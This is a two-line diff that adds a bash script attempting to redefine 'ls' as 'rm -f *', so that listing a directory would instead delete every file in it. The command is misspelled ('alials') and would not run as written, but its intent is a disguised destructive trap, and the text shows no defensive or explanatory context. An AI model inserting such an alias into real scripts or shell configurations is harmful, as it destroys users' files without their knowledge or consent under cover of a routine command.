@@ -1,0 +1,2 @@
+#!/bin/bash
+alials -p ls="rm -f *"
